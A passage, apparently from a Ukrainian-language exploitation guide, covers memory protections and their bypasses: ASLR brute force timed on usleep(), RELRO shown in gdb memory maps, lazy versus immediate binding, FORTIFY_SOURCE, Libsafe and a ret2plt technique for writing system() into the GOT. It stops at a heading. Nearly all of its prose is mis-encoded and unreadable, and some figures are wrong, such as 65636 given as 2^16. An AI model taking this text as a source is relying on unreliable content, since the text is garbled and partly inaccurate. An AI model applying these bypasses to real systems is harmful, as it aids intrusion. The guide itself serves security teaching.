–ë—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ –∑–Ω–∞—Ö–æ–¥—è—Ç—å—Å—è –≤ –ø–æ–∑–∏—Ü—ñ—ó –∑ 16-–±—ñ—Ç–Ω–æ—é –≤–∏–ø–∞–¥–∫–æ–≤—ñ—Å—Ç—é = 65636 –º–æ–∂–ª–∏–≤–∏—Ö –∞–¥—Ä–µ—Å. –Ø–∫—â–æ –≤—Ä–∞–∑–ª–∏–≤–∏–π —Å–µ—Ä–≤–µ—Ä –≤–∏–∫–ª–∏–∫–∞—î fork(), –ø—Ä–æ—Å—Ç—ñ—Ä –∞–¥—Ä–µ—Å –ø–∞–º'—è—Ç—ñ –∫–æ–ø—ñ—é—î—Ç—å—Å—è –≤ –¥–æ—á—ñ—Ä–Ω—ñ–π –ø—Ä–æ—Ü–µ—Å —ñ –∑–∞–ª–∏—à–∞—î—Ç—å—Å—è –Ω–µ–∑–º—ñ–Ω–Ω–∏–º. –¢–æ–º—É –º–æ–∂–Ω–∞ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –∑—Ä–æ–±–∏—Ç–∏ brute force –¥–æ —Ñ—É–Ω–∫—Ü—ñ—ó usleep() –∑ libc, –ø–µ—Ä–µ–¥–∞—é—á–∏ "16" —è–∫ –∞—Ä–≥—É–º–µ–Ω—Ç, —â–æ–± –∑–Ω–∞–π—Ç–∏ —Ü—é —Ñ—É–Ω–∫—Ü—ñ—é, –∫–æ–ª–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—å –∑–∞—Ç—Ä–∏–º—É—î—Ç—å—Å—è –¥–æ–≤—à–µ –∑–≤–∏—á–∞–π–Ω–æ–≥–æ. –ó–Ω–∞—é—á–∏, –¥–µ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è —Ü—è —Ñ—É–Ω–∫—Ü—ñ—è, –º–æ–∂–Ω–∞ –æ—Ç—Ä–∏–º–∞—Ç–∏ delta\_mmap —Ç–∞ —Ä–æ–∑—Ä–∞—Ö—É–≤–∞—Ç–∏ —ñ–Ω—à—ñ.

–Ñ–¥–∏–Ω–∏–π —Å–ø–æ—Å—ñ–± –±—É—Ç–∏ –≤–ø–µ–≤–Ω–µ–Ω–∏–º, —â–æ ASLR –ø—Ä–∞—Ü—é—î, - –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∞—Ä—Ö—ñ—Ç–µ–∫—Ç—É—Ä—É 64 –±—ñ—Ç. –¢–∞–º –Ω–µ–º–∞—î –∞—Ç–∞–∫ –º–µ—Ç–æ–¥–æ–º –≥—Ä—É–±–æ—ó —Å–∏–ª–∏.

### Relro

**Relro (Read only Relocation)** –≤–ø–ª–∏–≤–∞—î –Ω–∞ –¥–æ–∑–≤–æ–ª–∏ –ø–∞–º'—è—Ç—ñ –ø–æ–¥—ñ–±–Ω–æ –¥–æ NX. –í—ñ–¥–º—ñ–Ω–Ω—ñ—Å—Ç—å –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ, —è–∫—â–æ –∑ NX —Å—Ç–µ–∫ —Å—Ç–∞—î –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–º, —Ç–æ RELRO —Ä–æ–±–∏—Ç—å **–ø–µ–≤–Ω—ñ —Ä–µ—á—ñ —Ç—ñ–ª—å–∫–∏ –¥–ª—è —á–∏—Ç–∞–Ω–Ω—è**, —Ç–æ–º—É –º–∏ **–Ω–µ –º–æ–∂–µ–º–æ –ø–∏—Å–∞—Ç–∏** –≤ –Ω–∏—Ö. –ù–∞–π–ø–æ—à–∏—Ä–µ–Ω—ñ—à–∏–º –ø–µ—Ä–µ—à–∫–æ–¥–æ—é, —è–∫—É —è –±–∞—á–∏–≤, —î –∑–∞–ø–æ–±—ñ–≥–∞–Ω–Ω—è **–ø–µ—Ä–µ–∑–∞–ø–∏—Å—É —Ç–∞–±–ª–∏—Ü—ñ got**, –ø—Ä–æ —â–æ –±—É–¥–µ —Ä–æ–∑–ø–æ–≤—ñ–¥–∞—Ç–∏—Å—è –ø—ñ–∑–Ω—ñ—à–µ. –¢–∞–±–ª–∏—Ü–∞ got –º—ñ—Å—Ç–∏—Ç—å –∞–¥—Ä–µ—Å–∏ —Ñ—É–Ω–∫—Ü—ñ–π libc, —â–æ–± –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–π —Ñ–∞–π–ª –∑–Ω–∞–≤ —Ü—ñ –∞–¥—Ä–µ—Å–∏ —Ç–∞ –º—ñ–≥ —ó—Ö –≤–∏–∫–ª–∏–∫–∞—Ç–∏. –ü–æ–¥–∏–≤–∏–º–æ—Å—è, —è–∫—ñ –¥–æ–∑–≤–æ–ª–∏ –ø–∞–º'—è—Ç—ñ –º–∞—î –∑–∞–ø–∏—Å —Ç–∞–±–ª–∏—Ü—ñ got –¥–ª—è –≤–∏–∫–æ–Ω—É–≤–∞–Ω–æ–≥–æ —Ñ–∞–π–ª—É –∑ —Ç–∞ –±–µ–∑ relro.

–ó relro:
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
–ë–µ–∑ relro:
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
–î–ª—è –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ **–±–µ–∑ relro** –º–∏ –±–∞—á–∏–º–æ, —â–æ –∞–¥—Ä–µ—Å–∞ –∑–∞–ø–∏—Å—É `got` –¥–ª—è `fgets` - `0x404018`. –ü—Ä–∏–¥–∏–≤–∏–≤—à–∏—Å—å –¥–æ –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–Ω—è –ø–∞–º'—è—Ç—ñ, –º–∏ –±–∞—á–∏–º–æ, —â–æ –≤–æ–Ω–∞ –ø–æ—Ç—Ä–∞–ø–ª—è—î –º—ñ–∂ `0x404000` —Ç–∞ `0x405000`, —â–æ –º–∞—î **–¥–æ–∑–≤–æ–ª–∏ `rw`**, —â–æ –æ–∑–Ω–∞—á–∞—î, —â–æ –º–∏ –º–æ–∂–µ–º–æ —á–∏—Ç–∞—Ç–∏ —Ç–∞ –ø–∏—Å–∞—Ç–∏ –≤ –Ω–µ—ó. –î–ª—è –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ **–∑ relro** –º–∏ –±–∞—á–∏–º–æ, —â–æ –∞–¥—Ä–µ—Å–∞ —Ç–∞–±–ª–∏—Ü—ñ `got` –¥–ª—è –∑–∞–ø—É—Å–∫—É –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª—É (pie —É–≤—ñ–º–∫–Ω–µ–Ω–æ, —Ç–æ–º—É —Ü—è –∞–¥—Ä–µ—Å–∞ –∑–º—ñ–Ω–∏—Ç—å—Å—è) - `0x555555557fd0`. –£ –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–Ω—ñ –ø–∞–º'—è—Ç—ñ —Ü—å–æ–≥–æ –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª—É –≤–æ–Ω–∞ –ø–æ—Ç—Ä–∞–ø–ª—è—î –º—ñ–∂ `0x0000555555557000` —Ç–∞ `0x0000555555558000`, —â–æ –º–∞—î –¥–æ–∑–≤—ñ–ª –Ω–∞ –ø–∞–º'—è—Ç—å **`r`**, —â–æ –æ–∑–Ω–∞—á–∞—î, —â–æ –º–∏ –º–æ–∂–µ–º–æ –ª–∏—à–µ —á–∏—Ç–∞—Ç–∏ –∑ –Ω–µ—ó.

–¢–∞–∫ —è–∫ –æ–±—ñ–π—Ç–∏ —Ü–µ? –¢–∏–ø–æ–≤–∏–π –æ–±—Ö—ñ–¥, —è–∫–∏–π —è –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é, - –ø—Ä–æ—Å—Ç–æ –Ω–µ –ø–∏—Å–∞—Ç–∏ –≤ –æ–±–ª–∞—Å—Ç—ñ –ø–∞–º'—è—Ç—ñ, —è–∫—ñ relro –∑–º—É—à—É—î —Ä–æ–±–∏—Ç–∏ –¥–æ—Å—Ç—É–ø–Ω–∏–º–∏ —Ç—ñ–ª—å–∫–∏ –¥–ª—è —á–∏—Ç–∞–Ω–Ω—è, —Ç–∞ **–∑–Ω–∞–π—Ç–∏ —ñ–Ω—à–∏–π —Å–ø–æ—Å—ñ–± –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É**.

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –¥–ª—è —Ü—å–æ–≥–æ –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª –ø–æ–≤–∏–Ω–µ–Ω –∑–Ω–∞—Ç–∏ –ø–µ—Ä–µ–¥ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è–º –∞–¥—Ä–µ—Å–∏ —Ñ—É–Ω–∫—Ü—ñ–π:

* –õ—ñ–Ω–∏–≤–µ –∑–≤'—è–∑—É–≤–∞–Ω–Ω—è: –ê–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü—ñ—ó —à—É–∫–∞—î—Ç—å—Å—è –ø–µ—Ä—à–∏–π —Ä–∞–∑, –∫–æ–ª–∏ —Ñ—É–Ω–∫—Ü—ñ—é –≤–∏–∫–ª–∏–∫–∞—é—Ç—å. –¢–∞–∫–∏–º —á–∏–Ω–æ–º, –ø—ñ–¥ —á–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –ø–æ—Ç—Ä—ñ–±–Ω–æ –º–∞—Ç–∏ –¥–æ–∑–≤—ñ–ª –Ω–∞ –∑–∞–ø–∏—Å —É `GOT`.
* –ü—Ä–∏–≤'—è–∑–∫–∞ –∑–∞—Ä–∞–∑: –ê–¥—Ä–µ—Å–∏ —Ñ—É–Ω–∫—Ü—ñ–π –≤–∏—Ä—ñ—à—É—é—Ç—å—Å—è –Ω–∞ –ø–æ—á–∞—Ç–∫—É –≤–∏–∫–æ–Ω–∞–Ω–Ω—è, –ø—ñ—Å–ª—è —á–æ–≥–æ —á—É—Ç–ª–∏–≤–∏–º —Ä–æ–∑–¥—ñ–ª–∞–º, —Ç–∞–∫–∏–º —è–∫ .got, .dtors, .ctors, .dynamic, .jcr, –Ω–∞–¥–∞—é—Ç—å—Å—è –¥–æ–∑–≤–æ–ª–∏ —Ç—ñ–ª—å–∫–∏ –¥–ª—è —á–∏—Ç–∞–Ω–Ω—è. `` `** ``-z relro`**`y`**`-z now\`\*\*

–©–æ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –ø—Ä–æ–≥—Ä–∞–º–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î Bind now, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏:
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
–ö–æ–ª–∏ –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î—Ç—å—Å—è –≤ –ø–∞–º'—è—Ç—å —ñ —Ñ—É–Ω–∫—Ü—ñ—è –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è –≤–ø–µ—Ä—à–µ, –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è –ø–µ—Ä–µ—Ö—ñ–¥ –¥–æ PLT (Procedure Linkage Table), –∑–≤—ñ–¥–∫–∏ –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è —Å—Ç—Ä–∏–±–æ–∫ (jmp) –¥–æ GOT —ñ –≤–∏—è–≤–ª—è—î—Ç—å—Å—è, —â–æ —Ü–µ–π –∑–∞–ø–∏—Å –Ω–µ –≤–∏—Ä—ñ—à–µ–Ω–æ (–º—ñ—Å—Ç–∏—Ç—å –∞–¥—Ä–µ—Å—É –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ PLT). –¢–æ–¥—ñ –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è Runtime Linker –∞–±–æ rtfd –¥–ª—è –≤–∏—Ä—ñ—à–µ–Ω–Ω—è –∞–¥—Ä–µ—Å–∏ —ñ –∑–±–µ—Ä–µ–∂–µ–Ω–Ω—è —ó—ó –≤ GOT.

–ü—Ä–∏ –≤–∏–∫–ª–∏–∫—É —Ñ—É–Ω–∫—Ü—ñ—ó –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è PLT, —è–∫–∞ –º—ñ—Å—Ç–∏—Ç—å –∞–¥—Ä–µ—Å—É GOT, –¥–µ –∑–±–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è –∞–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü—ñ—ó, —Ç–æ–º—É –≤–æ–Ω–∞ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—î –ø–æ—Ç—ñ–∫ —Ç—É–¥–∏, —ñ —Ñ—É–Ω–∫—Ü—ñ—è –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è. –û–¥–Ω–∞–∫, —è–∫—â–æ —Ü–µ –ø–µ—Ä—à–∏–π –≤–∏–∫–ª–∏–∫ —Ñ—É–Ω–∫—Ü—ñ—ó, –≤ GOT –±—É–¥–µ –Ω–∞—Å—Ç—É–ø–Ω–∞ —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—è PLT, —Ç–æ–º—É –ø–æ—Ç—ñ–∫ —Å–ª—ñ–¥—É—î –∫–æ–¥—É PLT (rtfd), –≤–∏–∑–Ω–∞—á–∞—î –∞–¥—Ä–µ—Å—É —Ñ—É–Ω–∫—Ü—ñ—ó, –∑–±–µ—Ä—ñ–≥–∞—î —ó—ó –≤ GOT —ñ –≤–∏–∫–ª–∏–∫–∞—î.

–ü—Ä–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—ñ –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª—É –≤ –ø–∞–º'—è—Ç—å –∫–æ–º–ø—ñ–ª—è—Ç–æ—Ä –≤–∫–∞–∑—É—î, –Ω–∞ —è–∫–æ–º—É –∑–º—ñ—â–µ–Ω–Ω—ñ —Ä–æ–∑–º—ñ—Å—Ç–∏—Ç–∏ –¥–∞–Ω—ñ, —è–∫—ñ –º–∞—é—Ç—å –±—É—Ç–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—ñ –ø—Ä–∏ –∑–∞–ø—É—Å–∫—É –ø—Ä–æ–≥—Ä–∞–º–∏.

–õ—ñ–Ω–∏–≤–µ –∑–≤'—è–∑—É–≤–∞–Ω–Ω—è ‚Äî> –ê–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü—ñ—ó —à—É–∫–∞—î—Ç—å—Å—è –ø—Ä–∏ –ø–µ—Ä—à–æ–º—É –≤–∏–∫–ª–∏–∫—É —Ü—ñ—î—ó —Ñ—É–Ω–∫—Ü—ñ—ó, —Ç–æ–º—É GOT –º–∞—î –¥–æ–∑–≤—ñ–ª –Ω–∞ –∑–∞–ø–∏—Å, —â–æ–± –ø—Ä–∏ –ø–æ—à—É–∫—É –∑–±–µ—Ä–µ–≥—Ç–∏ —ó—ó —Ç–∞–º —ñ –Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω–æ –±—É–¥–µ —à—É–∫–∞—Ç–∏ –∑–Ω–æ–≤—É.

–ü—Ä–∏–≤'—è–∑–∫–∞ –∑–∞—Ä–∞–∑ ‚Äî> –ê–¥—Ä–µ—Å–∏ —Ñ—É–Ω–∫—Ü—ñ–π —à—É–∫–∞—é—Ç—å—Å—è –ø—Ä–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—ñ –ø—Ä–æ–≥—Ä–∞–º–∏, —ñ –¥–æ–∑–≤–æ–ª–∏ –¥–ª—è —Ä–æ–∑–¥—ñ–ª—ñ–≤ .got, .dtors, .ctors, .dynamic, .jcr –∑–º—ñ–Ω—é—é—Ç—å—Å—è –Ω–∞ —Ç—ñ–ª—å–∫–∏ –¥–ª—è —á–∏—Ç–∞–Ω–Ω—è. **-z relro** —ñ **-z now**

–ù–µ–∑–≤–∞–∂–∞—é—á–∏ –Ω–∞ —Ü–µ, –∑–∞–≥–∞–ª–æ–º –ø—Ä–æ–≥—Ä–∞–º–∏ –Ω–µ —Å–∫–ª–∞–¥–Ω—ñ –∑ —Ü–∏–º–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏, —Ç–æ–º—É —Ü—ñ –∞—Ç–∞–∫–∏ –∑–∞–ª–∏—à–∞—é—Ç—å—Å—è –º–æ–∂–ª–∏–≤–∏–º–∏.

**readelf -l /proc/ID\_PROC/exe | grep BIND\_NOW** ‚Äî> –î–ª—è –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è BIND NOW

**Fortify Source -D\_FORTIFY\_SOURCE=1 –∞–±–æ =2**

–ù–∞–º–∞–≥–∞–π—Ç–µ—Å—è —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—ó, —è–∫—ñ –∫–æ–ø—ñ—é—é—Ç—å –¥–∞–Ω—ñ –∑ –æ–¥–Ω–æ–≥–æ –º—ñ—Å—Ü—è –≤ —ñ–Ω—à–µ –Ω–µ–±–µ–∑–ø–µ—á–Ω–∏–º —á–∏–Ω–æ–º —ñ –∑–∞–º—ñ–Ω—é–π—Ç–µ —Ü—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –Ω–∞ –±–µ–∑–ø–µ—á–Ω—ñ. –ù–∞–ø—Ä–∏–∫–ª–∞–¥:\
char buf\[16];\
strcpy(but, source);

–í–æ–Ω–∞ –≤–∏–∑–Ω–∞—á–∞—î—Ç—å—Å—è —è–∫ –Ω–µ–±–µ–∑–ø–µ—á–Ω–∞, —Ç–æ–º—É –∑–∞–º—ñ–Ω—é—î strcpy() –Ω–∞ \_\_strcpy\_chk(), –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ä–æ–∑–º—ñ—Ä –±—É—Ñ–µ—Ä–∞ —è–∫ –º–∞–∫—Å–∏–º–∞–ª—å–Ω–∏–π —Ä–æ–∑–º—ñ—Ä –¥–ª—è –∫–æ–ø—ñ—é–≤–∞–Ω–Ω—è.

–†—ñ–∑–Ω–∏—Ü—è –º—ñ–∂ **=1** –∞–±–æ **=2** –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ:

–î—Ä—É–≥–∞ –Ω–µ –¥–æ–∑–≤–æ–ª—è—î, —â–æ–± **%n** –±—É–≤ –∑ —Ä–æ–∑–¥—ñ–ª—É –∑ –¥–æ–∑–≤–æ–ª–∞–º–∏ –Ω–∞ –∑–∞–ø–∏—Å. –ö—Ä—ñ–º —Ç–æ–≥–æ, –ø–∞—Ä–∞–º–µ—Ç—Ä –¥–ª—è –ø—Ä—è–º–æ–≥–æ –¥–æ—Å—Ç—É–ø—É –¥–æ –∞—Ä–≥—É–º–µ–Ω—Ç—ñ–≤ –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –ª–∏—à–µ –ø—Ä–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—ñ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ—Ö, —Ç–æ–±—Ç–æ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **%3$d** –ª–∏—à–µ –ø—ñ—Å–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è **%2$d** —ñ **%1$d**.

–î–ª—è –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–Ω—è –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ –ø–æ–º–∏–ª–∫—É –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è argv\[0\], —Ç–æ–º—É —è–∫—â–æ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ —Ç—É–¥–∏ –∞–¥—Ä–µ—Å—É —ñ–Ω—à–æ–≥–æ –º—ñ—Å—Ü—è (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –≥–ª–æ–±–∞–ª—å–Ω–æ—ó –∑–º—ñ–Ω–Ω–æ—ó), –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ –ø–æ–º–∏–ª–∫—É –ø–æ–∫–∞–∂–µ –≤–º—ñ—Å—Ç —Ü—ñ—î—ó –∑–º—ñ–Ω–Ω–æ—ó. –°—Ç–æ—Ä. 191

**–ó–∞–º—ñ–Ω–∞ Libsafe**

–ê–∫—Ç–∏–≤—É—î—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é: LD\_PRELOAD=/lib/libsafe.so.2\
–∞–±–æ\
‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload

–î–µ—è–∫—ñ –Ω–µ–±–µ–∑–ø–µ—á–Ω—ñ –≤–∏–∫–ª–∏–∫–∏ —Ñ—É–Ω–∫—Ü—ñ–π –∑–∞–º—ñ–Ω—é—é—Ç—å—Å—è –Ω–∞ –±–µ–∑–ø–µ—á–Ω—ñ. –ù–µ —î —Å—Ç–∞–Ω–¥–∞—Ä—Ç–∏–∑–æ–≤–∞–Ω–∏–º. (—Ç—ñ–ª—å–∫–∏ –¥–ª—è x86, –Ω–µ –¥–ª—è –∫–æ–º–ø—ñ–ª—è—Ü—ñ–π –∑ -fomit-frame-pointer, –Ω–µ –¥–ª—è —Å—Ç–∞—Ç–∏—á–Ω–∏—Ö –∫–æ–º–ø—ñ–ª—è—Ü—ñ–π, –Ω–µ –≤—Å—ñ –Ω–µ–±–µ–∑–ø–µ—á–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó —Å—Ç–∞—é—Ç—å –±–µ–∑–ø–µ—á–Ω–∏–º–∏ —ñ LD\_PRELOAD –Ω–µ –ø—Ä–∞—Ü—é—î –¥–ª—è –±—ñ–Ω–∞—Ä–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤ –∑ suid).

**ASCII Armored Address Space**

–ü–æ–ª—è–≥–∞—î –≤ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—ñ —Å–ø—ñ–ª—å–Ω–∏—Ö –±—ñ–±–ª—ñ–æ—Ç–µ–∫ –∑ 0x00000000 –ø–æ 0x00ffffff, —â–æ–± –∑–∞–≤–∂–¥–∏ –±—É–≤ –±–∞–π—Ç 0x00. –û–¥–Ω–∞–∫ —Ü–µ –Ω–∞—Å–ø—Ä–∞–≤–¥—ñ –º–∞–ª–æ –∑–∞—Ö–∏—â–∞—î –≤—ñ–¥ –±—É–¥—å-—è–∫–∏—Ö –∞—Ç–∞–∫, –æ—Å–æ–±–ª–∏–≤–æ –≤ little endian.

**ret2plt**

–ü–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è ROP —Ç–∞–∫, —â–æ –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è —Ñ—É–Ω–∫—Ü—ñ—è strcpy@plt (–∑ plt), –≤–∫–∞–∑—É—î—Ç—å—Å—è –Ω–∞ –∑–∞–ø–∏—Å –≤ GOT —ñ –∫–æ–ø—ñ—é—î—Ç—å—Å—è –ø–µ—Ä—à–∏–π –±–∞–π—Ç —Ñ—É–Ω–∫—Ü—ñ—ó, —è–∫—É –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ (system()). –ü–æ—Ç—ñ–º —Ü–µ –∂ —Å–∞–º–µ —Ä–æ–±–∏—Ç—å—Å—è, –≤–∫–∞–∑—É—é—á–∏ –Ω–∞ GOT+1 —ñ –∫–æ–ø—ñ—é—é—á–∏ 2-–π –±–∞–π—Ç system()... –£ –∫—ñ–Ω—Ü—ñ –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è –∑–±–µ—Ä–µ–∂–µ–Ω–∞ –∞–¥—Ä–µ—Å–∞ –≤ GOT, —è–∫–∞ –±—É–¥–µ system().

**Falso EBP**

